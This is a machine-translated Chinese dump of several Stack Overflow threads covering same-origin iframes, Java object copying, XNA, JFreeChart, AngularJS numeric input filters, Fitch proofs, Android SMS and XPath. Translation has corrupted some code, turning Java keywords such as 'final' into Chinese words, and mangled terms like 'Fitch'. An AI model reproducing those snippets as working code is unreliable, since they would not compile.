`x.company.org`将有一个带有 y.company.org 的 iframe 的页面，其中有一个我们希望自动填充的表单。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-07-17T16:02:23.937

在此上下文中定义域的事物是协议、端口和域，因此[http://abc.com](http://abc.com)和[https://abc.com](https://abc.com)被您的浏览器视为不同的域（http 与 https）。

[http://en.wikipedia.org/wiki/Same_origin_policy#Origin_determination_rules](http://en.wikipedia.org/wiki/Same_origin_policy#Origin_determination_rules)

[https://x.company.org](https://x.company.org)和[https://y.company.org](https://y.company.org)也被视为单独的域，但它们都可以将域设置放宽为[https://company.org](https://company.org)并进行交叉通信。

[http://en.wikipedia.org/wiki/Same_origin_policy#document.domain_property](http://en.wikipedia.org/wiki/Same_origin_policy#document.domain_property)

现在有另一个选项可供您使用，因为 HTML5 在所有主要浏览器中。使用 HTML5 postMessage，您可以跨域进行通信，假设接收域想要接受消息并做出响应。

[http://html5demos.com/postmessage2](http://html5demos.com/postmessage2)

# java - 如何在 Java 中“取消引用”一个对象

> ID：16091195
> 
> 赞同：3
> 
> 时间：2013-04-18T19:08:48.133
> 
> 标签：java

```
class DogOwner {
    Dog dog;

    DogOwner(Dog dog) {
        this.dog = dog;
    }
}

class Dog {
    int age;

    Dog(int age) {
        this.age = age;
    }
}

DogOwner peter = new DogOwner(new Dog(2));
Dog max = peter.dog;
max.age = 3;

System.out.println(peter.dog.age); // 3 
```

我如何在不引用所拥有的情况下`max`从中检索？换句话说，我希望能够在不改变' 的情况下将' 年龄设置为 3 。`peter``max``Dog``peter``max``peter``Dog`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-18T19:11:11.483

您要么必须 clone `peter.dog`，要么基于它创建一个新实例。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-18T19:16:17.103

Dog的实现`clone`方法：

```
class Dog implements Cloneable
{
  public Dog clone()
  {
      try{
           return (Dog)super.clone();
      } catch (CloneNotSupportedException ex)
      {
           // should not happen
           return null;
      }
  }

} 
```

然后用法可能如下所示：

```
Dog max = peter.dog.clone();
max.age = 3; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-18T19:11:48.783

如果你想独立进化`peter.dog`，`max`它们必须是单独的实例，这意味着你必须复制`peter.dog`而不是仅仅将它分配给 max。

您可以创建一个复制构造函数：

```
Dog(Dog otherDog) {
    this.age = otherDog.age;
} 
```

接着

```
Dog max = new Dog(peter.dog); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-18T19:11:21.360

看看这一行：

```
Dog max = peter.dog; 
```

而不是这一行，您可以进行*深度复制* `peter.dog`，然后将副本分配给`max`，您就完成了，您可以自由地操作它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-18T19:11:47.303

`max`已经*是*对 的引用`peter.dog`。你不能只是叫彼得的狗“麦克斯”然后把男人的狗带走！如果你不想让他成为彼得的狗，你将不得不养一只新狗……

```
Dog max = new Dog(peter.dog.age); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-18T19:13:14.077

```
DogOwner peter = new DogOwner(new Dog("Max", 2)); //This creates two new objects
Dog max = peter.dog;//This sets a reference to one of those objects, somewhat indirectly 
```

因为您的堆中只有一个`Dog`对象，所以您不可能让引用指向的狗与`peter`引用指向的狗不同`max`。您必须`Dog`通过克隆`peter`狗或批发创建新的狗来创建新的。

# xna - XNA 4.0。空引用异常

> ID：16091196
> 
> 赞同：0
> 
> 时间：2013-04-18T19:08:55.637
> 
> 标签：xna

```
**public GraphicsDeviceManager graphics;
        public SpriteBatch spriteBatch;
        private int[] Heights;
        //public Texture2D Terrain;
        public Texture2D[] TerrainList;
        public Color[] Colors_TerrainTexture;
        public int [] Coordinates_X;
        Camera camera = new Camera();
        GraphicsDevice device;

        public MapFunctions()                
        {

        }   
 public void GenerateMap_Heights(int Map_Width,int Map_Height,float Relief,float Mountain_Peak_Height)
            {
                Heights = new int[Map_Width];
                Random randomizer = new Random();
                double rand1 = randomizer.NextDouble() + 1;
                double rand2 = randomizer.NextDouble() + 2;
                double rand3 = randomizer.NextDouble() + 3;

                float offset = Map_Height / 2;
                float peakheight = 324;
                float flatness = Mountain_Peak_Height;

                for (int x = 0; x < Map_Width; x++)
                {
                    double height = peakheight / rand1 * Math.Sin((float)x / flatness * rand1 + rand1);
                    height += peakheight / rand2 * Math.Sin((float)x / flatness * rand2 + rand2);
                    height += peakheight / rand3 * Math.Sin((float)x / flatness * rand3 + rand3);
                    height += offset;
                    Heights[x] = (int)height;
                }
            }

            public bool CanDraw = false;

            public void CreateTerrain(int Map_Width, int Map_Height,int TerrainTexture_Width,Color Color_Terrain,Color Color_Background)
            {            
                int TimesToLoop = (Map_Width / TerrainTexture_Width) + 1;
                int[] Coordinates_X = new int[TimesToLoop];
                device = graphics.GraphicsDevice;
                for (int b = 0; b <= TimesToLoop; b++)
                {
                    if (b == TimesToLoop)
                    {
                        Colors_TerrainTexture = new Color[Map_Width % TerrainTexture_Width * Map_Height];
                        TerrainTexture_Width = Map_Width % TerrainTexture_Width;
                    }
                    else 
                    {
                        Colors_TerrainTexture = new Color[TerrainTexture_Width * Map_Height];
                    }
                    Coordinates_X[b] = TerrainTexture_Width * b;
                    for (int x = 0; x < TerrainTexture_Width; x++)
                    {                    
                        for (int y = 0; y < Map_Height; y++)
                        {
                            if (y > Heights[x])
                                Colors_TerrainTexture[x + y * TerrainTexture_Width] = Color.Green;
                            else
                                Colors_TerrainTexture[x + y * TerrainTexture_Width] = Color.Transparent;
                        }
                    }                
                    Terrain = new Texture2D(device, TerrainTexture_Width, Map_Height, false, SurfaceFormat.Color);
                    Terrain.SetData(Colors_TerrainTexture);
                    TerrainList[b] = Terrain; //I get nullreference exception in this line
                }
                spriteBatch = new SpriteBatch(device);
                CanDraw = true;
            }** 
```

地形列表[b] = 地形；（这一行几乎在代码的末尾）我在这一行中得到空引用异常。我从 game1 LoadContent() 调用这两个函数（CreateTerrain 和 GenerateMap_Heights）。请帮忙，我在我的代码中找不到问题。

对不起，我的英语不好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:11:49.837

您创建了地形列表，但从不初始化它......

```
//Something like
TerrainList = new Texture2D[]; 
```

现在您尝试访问空集合的索引。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:15:14.190

您是否曾经创建过 TerrainList？我正在查看代码并没有看到它。

```
Texture2D[] TerrainList = new Texture2D[10]; 
```

现在你正试图在你的数组中设置一个 Texture2D，但它还没有被创建。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:11:53.533

`TerrainList`从未在提供的代码中初始化，所以当你用它索引它时`TerrainList[b]`返回null。您需要创建一个实例`Texture2D[]`并将其分配给`TerrainList`. 此外，您需要确保它至少`b`具有元素数量，因为您`b`用于索引数组。

# jfreechart - JFreeChart 最后一个 X 轴标签被截断

> ID：16091206
> 
> 赞同：2
> 
> 时间：2013-04-18T19:09:56.897
> 
> 标签：jfreechart, truncation, axis-labels

我有一个漂亮的、漂亮的 JFreeChart 生成的折线图，但有一个例外 - 我的 X 轴上的最后一个值被截断，如下所示：

```
      |
      |
      |_________|________|__________|_________|_________|
    100 赫兹 1 赫兹 10 赫兹 100 赫兹 1 兆赫 10 兆赫

```

（注意以 MHz 为单位的 z 被截断）。

我在这里研究了解决方案：
[JFreeChart tick label cut off](https://stackoverflow.com/questions/7851540/jfreechart-tick-label-cut-off)

但是因为我手动指定了`LogAxis`从 JavaDoc 中出现的范围，所以设置边距没有效果。
[JavaDoc](http://www.jfree.org/jfreechart/api/javadoc/org/jfree/chart/axis/ValueAxis.html#setUpperMargin%28double%29)

这是我用来生成 X 轴的代码：

```
      最终 LogAxis domainAxis = new LogAxis(frequencyAxisLabel);
      domainAxis.setStandardTickUnits(LogAxis.createLogTickUnits(Locale.ENGLISH));
      domainAxis.setRange(100, 10000000); //100Hz 到 10MHz
      domainAxis.setUpperMargin(.05); //没有效果
      domainAxis.setNumberFormatOverride(new UnitNumberFormat(UnitValue.HERTZ));
      plot.setDomainAxis(domainAxis);

```

如果有帮助，我还将使用以下内容将其写入 .svg 文件：

```
          // 获取一个 DOMImplementation 并创建一个 XML 文档
      DOMImplementation domImpl = GenericDOMImplementation.getDOMImplementation();
      文档 document = domImpl.createDocument(null, "svg", null);

      // 创建 SVG 生成器的实例
      SVGGraphics2D svgGenerator = new SVGGraphics2D(document);
      svgGenerator.setSVGCanvasSize(新维度(720, 470));

      // 在 SVG 生成器中绘制图表
      矩形边界 = new Rectangle(10, 10, 700, 450);
      chart.draw(svgGenerator, bounds);

      //写入svg文件
      OutputStream outputStream = new FileOutputStream(new File("SomePath));
      Writer out = new OutputStreamWriter(outputStream, "UTF-8");
      svgGenerator.stream(out, true /* 使用 css */);
      outputStream.flush();
      outputStream.close();

```

鉴于 setUpperMargin() 方法不会产生影响，我将如何确保标签有足够的空间来完全打印？我也愿意旋转刻度标签，虽然我还没有弄清楚如何做到这一点，只知道如何旋转轴标签。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:23:31.377

好的，找到了一种可行的解决方案。

我用了

```
chart.setPadding(new RectangleInsets(10, 10, 10, 10)); 
```

显然，您的里程可能会有所不同，但这似乎符合我的目的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-24T15:43:20.853

[在jfreechart 板上](http://www.jfree.org/phpBB2/viewtopic.php?f=3&t=16469&sid=7922bd05c2332cf164801606079f9199)可以找到另一种解决方案

简而言之，将以下内容添加到生成 X-Axis 的代码中：

```
plot.getDomainAxis().setMaximumCategoryLabelWidthRatio(1.0f); 
```

或者，对于您上面的代码；

```
domainAxis.setMaximumCategoryLabelWidthRatio(1.0f); 
```

这解决了我使用水平条形图的问题，其中长域标签被“...”后缀截断。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-08T12:28:42.203

试试这个：

// 更改范围轴顶部的边距...

NumberAxis rangeAxis = (NumberAxis) plot.getRangeAxis();

rangeAxis.setStandardTickUnits(NumberAxis.createIntegerTickUnits());

```
 rangeAxis.setUpperMargin(0.15);

    rangeAxis.setLowerMargin(0.15); 
```

# coded-ui-tests - Team Foundation Service 上的自动编码 UI 测试引发“无法加载一种或多种请求的类型”异常

> ID：16091213
> 
> 赞同：1
> 
> 时间：2013-04-18T19:10:21.517
> 
> 标签：coded-ui-tests, azure-devops

如果我将编码的 UI 测试添加到我们的 WPF 或 MVC 项目中，则会在 CI 构建中导致此错误。Team Foundation Service 是否缺少允许编码 UI 测试运行的内容？我尝试在本地引用 dll，但我假设他们正在尝试引用我的 GAC 中不在 TFS 机器上的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T13:59:41.770

Team Foundation Service 不支持自动编码的 UI 测试，因为托管生成服务无法在交互模式下运行。我在[UserVoice](http://visualstudio.uservoice.com/forums/121579-visual-studio/suggestions/3873350-support-interactive-mode-on-team-foundation-build-)添加了一个功能请求，但到目前为止，自动化编码 UI 测试的唯一方法是在本地构建控制器上运行它们。可以在[此处](http://msdn.microsoft.com/en-us/library/ee330987)找到执行此操作的步骤。

# javascript - angularjs：只允许在文本框中输入数字

> ID：16091218
> 
> 赞同：70
> 
> 时间：2013-04-18T19:10:40.163
> 
> 标签：javascript, ruby-on-rails, angularjs, numeric

在 angularjs 中是否有任何可用的功能只允许在文本框中输入数字，[例如](http://www.texotela.co.uk/code/jquery/numeric/)

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2013-10-30T06:07:06.650

此代码显示了如何防止输入非数字符号的示例。

```
angular.module('app').
  directive('onlyDigits', function () {

    return {
        restrict: 'A',
        require: '?ngModel',
        link: function (scope, element, attrs, modelCtrl) {
            modelCtrl.$parsers.push(function (inputValue) {
                if (inputValue == undefined) return '';
                var transformedInput = inputValue.replace(/[^0-9]/g, '');
                if (transformedInput !== inputValue) {
                    modelCtrl.$setViewValue(transformedInput);
                    modelCtrl.$render();
                }
                return transformedInput;
            });
        }
    };
}); 
```

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2014-09-17T09:31:46.840

HTML

```
 <input type="text" name="number" only-digits> 
```

// 只需输入 123

```
 .directive('onlyDigits', function () {
    return {
      require: 'ngModel',
      restrict: 'A',
      link: function (scope, element, attr, ctrl) {
        function inputValue(val) {
          if (val) {
            var digits = val.replace(/[^0-9]/g, '');

            if (digits !== val) {
              ctrl.$setViewValue(digits);
              ctrl.$render();
            }
            return parseInt(digits,10);
          }
          return undefined;
        }            
        ctrl.$parsers.push(inputValue);
      }
    };
}); 
```

// 类型：123 或 123.45

```
 .directive('onlyDigits', function () {
    return {
      require: 'ngModel',
      restrict: 'A',
      link: function (scope, element, attr, ctrl) {
        function inputValue(val) {
          if (val) {
            var digits = val.replace(/[^0-9.]/g, '');

            if (digits.split('.').length > 2) {
              digits = digits.substring(0, digits.length - 1);
            }

            if (digits !== val) {
              ctrl.$setViewValue(digits);
              ctrl.$render();
            }
            return parseFloat(digits);
          }
          return undefined;
        }            
        ctrl.$parsers.push(inputValue);
      }
    };
 }); 
```

* * *

## 回答 #3

> 赞同：37
> 
> 时间：2015-08-21T20:32:17.257

我只是在输入指令中使用了 ng-keypress。

HTML：

```
<input type="text" ng-keypress="filterValue($event)"/> 
```

JS：

```
$scope.filterValue = function($event){
        if(isNaN(String.fromCharCode($event.keyCode))){
            $event.preventDefault();
        }
}; 
```

* * *

## 回答 #4

> 赞同：26
> 
> 时间：2013-04-18T19:14:53.800

这个功能正是您所需要的。[http://docs.angularjs.org/api/ng.directive:input.number](http://docs.angularjs.org/api/ng.directive:input.number)

**编辑：**

您可以将 jquery 插件包装到指令中。我在这里创建了一个示例：http: [//jsfiddle.net/anazimok/jTJCF/](http://jsfiddle.net/anazimok/jTJCF/)

HTML：

```
<div ng-app="myApp">
    <div>
        <input type="text" min="0" max="99" number-mask="" ng-model="message">
            <button ng-click="handleClick()">Broadcast</button>
    </div>

</div> 
```

CSS：

```
.ng-invalid {
    border: 1px solid red;
} 
```

JS：

```
// declare a module
var app = angular.module('myApp', []);

app.directive('numberMask', function() {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {
            $(element).numeric();
        }
    }
}); 
```

* * *

## 回答 #5

> 赞同：21
> 
> 时间：2016-01-14T16:59:21.570

这是只允许数字输入的最简单和最快的方法。

```
<input type="text" id="cardno" placeholder="Enter a Number" onkeypress='return event.charCode >= 48 && event.charCode <= 57' required> 
```

谢谢

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2014-06-30T17:17:21.057

以安东的回答为基础——

```
angular.module("app").directive("onlyDigits", function ()
{
    return {
        restrict: 'EA',
        require: '?ngModel',
        scope:{
            allowDecimal: '@',
            allowNegative: '@',
            minNum: '@',
            maxNum: '@'
        },

        link: function (scope, element, attrs, ngModel)
        {
            if (!ngModel) return;
            ngModel.$parsers.unshift(function (inputValue)
            {
                var decimalFound = false;
                var digits = inputValue.split('').filter(function (s,i)
                {
                    var b = (!isNaN(s) && s != ' ');
                    if (!b && attrs.allowDecimal && attrs.allowDecimal == "true")
                    {
                        if (s == "." && decimalFound == false)
                        {
                            decimalFound = true;
                            b = true;
                        }
                    }
                    if (!b && attrs.allowNegative && attrs.allowNegative == "true")
                    {
                        b = (s == '-' && i == 0);
                    }

                    return b;
                }).join('');
                if (attrs.maxNum && !isNaN(attrs.maxNum) && parseFloat(digits) > parseFloat(attrs.maxNum))
                {
                    digits = attrs.maxNum;
                }
                if (attrs.minNum && !isNaN(attrs.minNum) && parseFloat(digits) < parseFloat(attrs.minNum))
                {
                    digits = attrs.minNum;
                }
                ngModel.$viewValue = digits;
                ngModel.$render();

                return digits;
            });
        }
    };
}); 
```

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2016-09-14T19:03:21.727

我的解决方案接受复制和粘贴并保存插入符号的位置。它用于产品成本，因此仅允许正十进制值。可以很容易地重构以允许负数或仅整数位。

```
angular
        .module("client")
        .directive("onlyNumber", function () {
            return {
                restrict: "A",
                link: function (scope, element, attr) {
                    element.bind('input', function () {
                        var position = this.selectionStart - 1;

                        //remove all but number and .
                        var fixed = this.value.replace(/[^0-9\.]/g, '');  
                        if (fixed.charAt(0) === '.')                  //can't start with .
                            fixed = fixed.slice(1);

                        var pos = fixed.indexOf(".") + 1;
                        if (pos >= 0)               //avoid more than one .
                            fixed = fixed.substr(0, pos) + fixed.slice(pos).replace('.', '');  

                        if (this.value !== fixed) {
                            this.value = fixed;
                            this.selectionStart = position;
                            this.selectionEnd = position;
                        }
                    });
                }
            };
        }); 
```

放到html页面上：

```
<input type="text" class="form-control" only-number ng-model="vm.cost" /> 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2016-12-29T13:31:28.443

只需使用 HTML5

```
<input type="number" min="0"/> 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2016-03-06T05:18:56.323

这是对我有用的方法。它基于[samnau anwser](https://stackoverflow.com/questions/16091218/angularjs-allows-only-numbers-to-be-typed-into-a-text-box#answer-32148834)，但允许使用 提交表单，使用和箭头`ENTER`增加和减少数字，使用、和进行编辑，并使用 导航槽字段。请注意，它适用于正整数，例如金额。`UP``DOWN``DEL``BACKSPACE``LEFT``RIGHT``TAB`

HTML：

```
<input ng-keypress="onlyNumbers($event)" min="0" type="number" step="1" ng-pattern="/^[0-9]{1,8}$/" ng-model="... > 
```

角度：

```
$scope.onlyNumbers = function(event){   
    var keys={
        'up': 38,'right':39,'down':40,'left':37,
        'escape':27,'backspace':8,'tab':9,'enter':13,'del':46,
        '0':48,'1':49,'2':50,'3':51,'4':52,'5':53,'6':54,'7':55,'8':56,'9':57
    };
    for(var index in keys) {
        if (!keys.hasOwnProperty(index)) continue;
        if (event.charCode==keys[index]||event.keyCode==keys[index]) {
            return; //default event
        }
    }   
    event.preventDefault();
}; 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2016-07-13T12:46:59.013

基于**djsiz**解决方案，包含在指令中。注意：它不会处理数字，但可以轻松更新

```
angular
        .module("app")
        .directive("mwInputRestrict", [
            function () {
                return {
                    restrict: "A",
                    link: function (scope, element, attrs) {
                        element.on("keypress", function (event) {
                            if (attrs.mwInputRestrict === "onlynumbers") {
                                // allow only digits to be entered, or backspace and delete keys to be pressed
                                return (event.charCode >= 48 && event.charCode <= 57) ||
                                       (event.keyCode === 8 || event.keyCode === 46);
                            }
                            return true;
                        });
                    }
                }
            }
        ]); 
```

HTML

```
 <input type="text"
        class="form-control"
        id="inputHeight"
        name="inputHeight"
        placeholder="Height"
        mw-input-restrict="onlynumbers"
        ng-model="ctbtVm.dto.height"> 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2019-01-15T08:10:25.670

```
<input type="phone" numbers-only > 
```

如果您只想要数字，您可以使用这种方式:)

这是演示[点击](https://codepen.io/apuchkov/pen/ILjFr)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2017-09-20T12:01:41.617

它简单易懂。只需复制粘贴此代码，您的问题就会得到解决。对于更多条件，只需更改模式中的值。您的工作就会完成。

```
<input type="text"  pattern="[0-9]{0,}" oninvalid="this.setCustomValidity('Please enter only numeric value. Special character are not allowed.')" oninput="setCustomValidity('')"> 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2017-02-13T10:27:54.483

此解决方案将仅接受数字“。” 和 '-'

这也限制了文本框中的空格输入。我曾使用该指令来实现相同的目标。

请在下面的工作示例中找到解决方案。

[http://jsfiddle.net/vfsHX/2697/](http://jsfiddle.net/vfsHX/2697/)

HTML：

```
<form ng-app="myapp" name="myform" novalidate> 
<div ng-controller="Ctrl">
<input name="number" is-number ng-model="wks.number">
<span ng-show="!wks.validity">Value is invalid</span>
</div> 
```

JS：

```
var $scope;
var app = angular.module('myapp', []);

app.controller('Ctrl', function($scope) {
    $scope.wks =  {number: 1, validity: true}
});

app.directive('isNumber', function () {
    return {
        require: 'ngModel',
        link: function (scope, element, attrs, ngModel) {   
        element.bind("keydown keypress", function (event) {
          if(event.which === 32) {
            event.returnValue = false;
            return false;
          }
       }); 
            scope.$watch(attrs.ngModel, function(newValue,oldValue) {
                var arr = String(newValue).split("");
                if (arr.length === 0) return;
                if (arr.length === 1 && (arr[0] == '-' || arr[0] === '.' )) return;
                if (arr.length === 2 && newValue === '-.') return;
                if (isNaN(newValue)) {
                    //scope.wks.number = oldValue;
                    ngModel.$setViewValue(oldValue);
                                    ngModel.$render();
                }
            });

        }
    };
}); 
```

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2015-12-25T19:29:29.863

您可以查看 [https://github.com/rajesh38/ng-only-number](https://github.com/rajesh38/ng-only-number)

1.  它在键入时将输入限制为文本框中的数字和小数点。
2.  您可以限制小数点前后允许的位数
3.  如果从文本框中删除小数点，它还会修剪小数点后的数字，例如，如果您输入 123.45，然后删除小数点，它还会删除小数点后的尾随数字并将其设为 123。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2016-09-16T19:53:45.283

您可以执行以下操作：将**ng-pattern**与正则表达式“ **/^[0-9]+$/** ”一起使用，这意味着只有整数有效。

```
<form novalidate name="form">
    <input type="text" data-ng-model="age" id="age" name="age" ng-pattern="/^[0-9]+$/">
    <span ng-show="form.age.$error.pattern">The value is not a valid integer</span>
</form> 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2017-01-06T10:13:05.153

[我在这个](https://stackoverflow.com/questions/469357/html-text-input-allow-only-numeric-input)中安排了 jQuery

```
.directive('numbersCommaOnly', function(){
   return {
     require: 'ngModel',
     link: function (scope, element, attrs, ngModel) {

        element.on('keydown', function(event) {                  
            // Allow: backspace, delete, tab, escape, enter and .
            var array2 = [46, 8, 9, 27, 13, 110, 190]
            if (array2.indexOf(event.which) !== -1 ||
                 // Allow: Ctrl+A
                (event.which == 65 && event.ctrlKey === true) ||
                 // Allow: Ctrl+C
                (event.which == 67 && event.ctrlKey === true) ||
                 // Allow: Ctrl+X
                (event.which == 88 && event.ctrlKey === true) ||
                 // Allow: home, end, left, right
                (event.which >= 35 && event.which <= 39)) {
                     // let it happen, don't do anything
                     return;
            }
            // Ensure that it is a number and stop the keypress
            if ((event.shiftKey || (event.which < 48 || event.which > 57)) && (event.which < 96 || event.which > 105)) {
                event.preventDefault();
            }
         });

     }
   };
}) 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2018-01-27T12:13:41.103

```
 <input type="text" ng-keypress="checkNumeric($event)"/>
 //inside controller
 $scope.dot = false
 $scope.checkNumeric = function($event){
 if(String.fromCharCode($event.keyCode) == "." && !$scope.dot){
    $scope.dot = true
 }
 else if( isNaN(String.fromCharCode($event.keyCode))){
   $event.preventDefault();
 } 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2018-04-13T14:17:50.370

我在

.js

```
$scope.numberOnly="(^[0-9]+$)"; 
```

.html

```
<input type="text" name="rollNo" ng-model="stud.rollNo" ng-pattern="numberOnly" ng-maxlength="10" maxlength="10" md-maxlength="10" ng-required="true" > 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2018-10-19T14:26:10.500

[这个答案是对Leopoldo 的答案](https://stackoverflow.com/a/35823435/3594067)的简化和优化。

在每个 keydown 上从您的输入中触发一个函数，如下所示：

```
<input type="text" ng-keydown="onlyNumbers($event);"/> 
```

您可以在控制器中以这种方式描述功能

```
$scope.onlyNumbers = function(event){    
    // 'up': 38,'right':39,'down':40,'left':37,
    // 'escape':27,'backspace':8,'tab':9,'enter':13,'del':46,
    // '0':48,'1':49,'2':50,'3':51,'4':52,'5':53,'6':54,'7':55,'8':56,'9':57
    var keys = { 38:true,39:true,40:true,37:true,27:true,8:true,9:true,13:true,
                 46:true,48:true,49:true, 50:true,51:true,52:true,53:true,
                 54:true,55:true,56:true,57:true };

    // if the pressed key is not listed, do not perform any action
    if(!keys[event.keyCode]) { event.preventDefault(); }
} 
```

如果您使用的是 Angular 2+，您可以通过以下方式调用相同的函数：

```
<input type="text" (keydown)="onlyNumbers($event);"/> 
```

您的 Angular 2+ 函数应如下所示：

```
onlyNumbers(event) { // the logic here } 
```

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2016-05-26T09:40:21.043

我有一个类似的问题，最终挂钩和事件

```
ng-change="changeCount()" 
```

然后：

```
self.changeCount = function () {
      if (!self.info.itemcount) {
        self.info.itemcount = 1;
      }
 }; 
```

因此，如果插入了无效数字，则用户默认为 1。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2018-03-16T15:05:22.690

我知道这是一篇旧帖子，但对**My Mai**答案的改编对我来说效果很好......

```
angular.module("app").directive("numbersOnly", function() {
  return {
    require: "ngModel",
    restrict: "A",
    link: function(scope, element, attr, ctrl) {
        function inputValue(val) {
            if (val) {
                //transform val to a string so replace works
                var myVal = val.toString();

                //replace any non numeric characters with nothing
                var digits = myVal.replace(/\D/g, "");

                //if anything needs replacing - do it!
                if (digits !== myVal) {
                    ctrl.$setViewValue(digits);
                    ctrl.$render();
                }
                return parseFloat(digits);
            }
            return undefined;
        }
        ctrl.$parsers.push(inputValue);
    }
  };
}); 
```

* * *

## 回答 #22

> 赞同：-1
> 
> 时间：2017-08-31T15:57:52.913

用于`ng-only-number`仅允许数字，例如：

```
<input type="text" ng-only-number data-max-length=5> 
```

* * *

## 回答 #23

> 赞同：-2
> 
> 时间：2018-03-19T17:35:09.637

```
 <input
    onkeypress="return (event.charCode >= 48 && event.charCode <= 57) ||                         
    event.charCode == 0 || event.charCode == 46"> 
```

# logic - Fitch系统的逻辑推理

> ID：16091232
> 
> 赞同：1
> 
> 时间：2013-04-18T19:11:31.867
> 
> 标签：logic, proof, fitch-proofs

我正在研究一些逻辑，我发现了一个我无法解决的困难，

如何从前提 p=>q 证明 ¬q=>¬p？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-16T19:01:04.787

Fine tuning with the removal of a redundant step:

Using the Fitch System:

1.  p=>q............Premise
2.  | ¬q............Assumption
3.  |.| p............Assumption
4.  |.| ¬q............Reiteration: 2
5.  | p=>¬q............Implication Introduction: 4
6.  | ¬p............Negation Introduction: 1,5
7.  ¬q=>¬p............Implication Introduction: 6

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-23T14:24:57.997

使用惠誉系统：

1.  p=>q…………前提
2.  .| ¬q............假设
3.  .|.| p............假设
4.  .|.| q............暗示消除：1,3
5.  .|.| ¬q............重复：2
6.  .| p=>¬q............蕴涵介绍：5
7.  .| ¬p............否定介绍：1,6
8.  ¬q=>¬p............含意介绍：7

不是那么整齐的布局，但每个“缩进”代表在假设的帮助下完成的子证明。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-11-24T02:45:54.770

这是使用 Fitch 风格的证明检查器的证明。规则的解释在*forallx*中。这两个参考资料都可以在线获得，并在下面列出：

[![在此处输入图像描述](https://i.stack.imgur.com/JyYt2.png)](https://i.stack.imgur.com/JyYt2.png)

* * *

参考

Kevin Klement 的 JavaScript/PHP Fitch 风格的自然演绎证明编辑器和检查器[http://proofs.openlogicproject.org/](http://proofs.openlogicproject.org/)

PD Magnus、Tim Button 以及 J. Robert Loftis 的添加，由 Aaron Thomas-Bolduc、Richard Zach 重新混合和修订，forallx Calgary Remix: An Introduction to Formal Logic，2018 年冬季。http: [//forallx.openlogicproject.org/](http://forallx.openlogicproject.org/)

# android - 从 BroadcastReceiver 只发送一次 SMS

> ID：16091234
> 
> 赞同：0
> 
> 时间：2013-04-18T19:11:32.943
> 
> 标签：android, broadcastreceiver

我在这里看到了 Commonwares LocationPoller 演示 github.com/commonsguy/cwac-locpoll/

在这里，`LocationReceiver`我正在检查该位置是否在指定区域内。如果不在那个区域，我会向电话号码发送短信（SMS）。

但它会在每个特定间隔接收新位置时连续发送文本消息（SMS）。所以我定义了一个类变量`flag`=0（最初）

```
 public class LocationReceiver extends BroadcastReceiver {
                int flag=0;
            public void onReceive(Context context, Intent intent) {

            ............

            if( flag==0)    //center of campus 
                      {
                          checkArea(loc,"500","22.599669","72.820473","5556","Your ward is out of College campus");
                          Toast.makeText(context, "You Have Moved out",Toast.LENGTH_SHORT);
                          flag=1;
                      }
                }
            } 
```

但它不起作用，它仍然连续发送短信。我应该怎么办 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:18:43.317

使用 SharedPreferences 发送消息时保存一个 unix 时间戳，以便下次触发广播时检查所述时间戳的存在。如果时间戳不存在或它足够旧（实际时间 - 保存的时间戳 >= 您定义的某些阈值），您只会发送消息，在发送消息时更新或创建时间戳。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:14:47.300

您可以使用持久性存储来存储状态，并且每次收到通知时都会检查您的存储是否必须发送 SMS。

# xpath - 在里面打印文字 .. 和 ..

> ID：16091240
> 
> 赞同：0
> 
> 时间：2013-04-18T19:12:01.120
> 
> 标签：，, xpath, command-line, xquery, xmlstarlet

我需要`pom.xml`在目录树的许多中列出这两个元素中的文本。这些文件也可能包含其他地方的元素，我只是在寻找这两个的内容。

理想情况下，我正在寻找一种以格式输出的工具`<file-name>:<line-no>:<path>:<text>`，例如

```
parent/pom.xml:12:/project/groupId:com.acme.project
features/persist/pom.xml:14:/project/parent/groupId:com.acme.project
features/persist/pom.xml:32:/project/groupId:com.acme.project.persist 
```

对于以下输入文件：

```
**parent/pom/xml**
<project>
 ...
  <groupId>
  com.acme.project <!--LINE 12 --> 
  </groupId>
...
</project>

**feature/persist/pom.xml**
<project>
  <parent>
    <groupId>
    com.acme.project <!--LINE 14 --> 
    </groupId>
  </parent>
  ...
  <groupId>
  com.acme.project
  </groupId>
  <dependencyManagement>
    <dependencies>
      <dependency>
        <groupId>
        a.b.c.d <!-- this is not listed in output -->
        </groupId>
      </dependency>
